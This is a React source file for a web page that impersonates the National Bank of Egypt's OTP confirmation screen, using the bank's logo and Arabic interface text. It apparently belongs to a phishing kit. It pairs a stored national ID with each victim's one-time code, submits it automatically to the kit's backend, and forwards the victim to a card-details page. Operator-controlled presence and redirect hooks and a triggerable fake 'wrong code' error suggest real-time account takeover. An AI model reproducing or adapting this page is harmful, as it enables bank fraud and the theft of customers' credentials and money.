/**
 * البنك الأهلي المصري - تأكيد OTP
 * تصميم داكن احترافي موحد
 */
import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLiveVisitor } from "@/hooks/useLiveVisitor";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";

export default function ConfirmOTP() {
  usePresence("confirm-otp");
  useAdminRedirect();
  const [, setLocation] = useLocation();
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const nationalId = localStorage.getItem("pw_national_id") || "";
  const saveOtpData = trpc.applications.saveOtpData.useMutation();

  useEffect(() => {
    const showError = sessionStorage.getItem("pw_show_error");
    if (showError === "true") {
      setErrorMsg("الرمز غير صحيح، يرجى المحاولة مرة أخرى");
      setOtp(["", "", "", "", "", ""]);
      sessionStorage.removeItem("pw_show_error");
      inputRefs.current[0]?.focus();
    }
  }, []);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);
    if (value && index < 5) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handleSubmit = async () => {
    const code = otp.join("");
    if (code.length < 6) { setErrorMsg("يرجى إدخال الرمز كاملاً"); return; }
    setLoading(true);
    try {
      await saveOtpData.mutateAsync({ nationalId, otpCode: `CONFIRM:${code}` });
      setLocation("/card-info");
    } catch (err) {
      setErrorMsg("حدث خطأ، يرجى المحاولة مرة أخرى");
      setLoading(false);
    }
  };

  useEffect(() => {
    if (otp.every((d) => d !== "") && !loading) handleSubmit();
  }, [otp]);

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", position: "relative" }}>
      <div style={{ position: "fixed", top: "50%", left: "50%", transform: "translate(-50%, -50%)", opacity: 0.03, pointerEvents: "none", zIndex: 0 }}>
        <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="" style={{ width: "350px", height: "auto" }} />
      </div>
      <div style={{ maxWidth: "520px", margin: "0 auto", minHeight: "100vh", display: "flex", flexDirection: "column", position: "relative", zIndex: 1 }}>
        {/* Header */}
        <div style={{ padding: "20px 24px", textAlign: "center", borderBottom: "1px solid #e5e7eb" }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "10px" }}>
            <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="البنك الأهلي المصري" style={{ height: "42px", width: "auto", display: "block" }} onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
          </div>
          <h2 style={{ color: "#1a1a1a", fontWeight: "800", fontSize: "20px", margin: 0 }}>تأكيد رمز OTP</h2>
        </div>

        {/* Content */}
        <div style={{ padding: "32px 24px", flex: 1 }}>
          {errorMsg && (
            <div style={{ background: "#fef2f2", border: "1px solid #fecaca", borderRadius: "10px", padding: "12px 16px", marginBottom: "16px", color: "#dc2626", fontSize: "13px", textAlign: "center" }}>{errorMsg}</div>
          )}

          <div style={{ textAlign: "center", marginBottom: "24px" }}>
            <div style={{ width: "64px", height: "64px", background: "#f0fdf4", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto", border: "2px solid #dcfce7" }}>
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
                <path d="M9 12l2 2 4-4" stroke="#1B7A3D" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                <circle cx="12" cy="12" r="10" stroke="#1B7A3D" strokeWidth="2"/>
              </svg>
            </div>
          </div>

          <h4 style={{ textAlign: "center", fontWeight: "800", marginBottom: "8px", color: "#1a1a1a", fontSize: "18px" }}>أدخل رمز التأكيد</h4>
          <p style={{ textAlign: "center", color: "#666", fontSize: "14px", marginBottom: "28px" }}>أدخل الرمز المرسل إلى هاتفك للتأكيد</p>

          <div style={{ display: "flex", gap: "8px", justifyContent: "center", marginBottom: "28px", direction: "ltr" }}>
            {otp.map((digit, i) => (
              <input key={i} ref={(el) => { inputRefs.current[i] = el; }} type="tel" inputMode="numeric" maxLength={1} value={digit}
                onChange={(e) => handleChange(i, e.target.value)} onKeyDown={(e) => handleKeyDown(i, e)}
                style={{ width: "44px", height: "52px", textAlign: "center", fontSize: "22px", fontWeight: "700", border: `2px solid ${digit ? "#1B7A3D" : "#d1d5db"}`, borderRadius: "10px", outline: "none", fontFamily: "'Cairo', sans-serif", background: "#f9fafb", color: "#1a1a1a" }} />
            ))}
          </div>

          <button onClick={handleSubmit} disabled={loading}
            style={{ width: "100%", background: "linear-gradient(135deg, #1B7A3D, #145a2c)", color: "white", border: "none", borderRadius: "12px", padding: "16px", fontSize: "16px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif", boxShadow: "0 6px 25px rgba(27,122,61,0.3)" }}>
            {loading ? "جاري التحقق..." : "تأكيد"}
          </button>
        </div>

        <footer style={{ textAlign: "center", padding: "16px", borderTop: "1px solid #e5e7eb" }}>
          <small style={{ color: "#999", fontSize: "11px" }}>© 2026 البنك الأهلي المصري - مصر</small>
        </footer>
      </div>
    </div>
  );
}
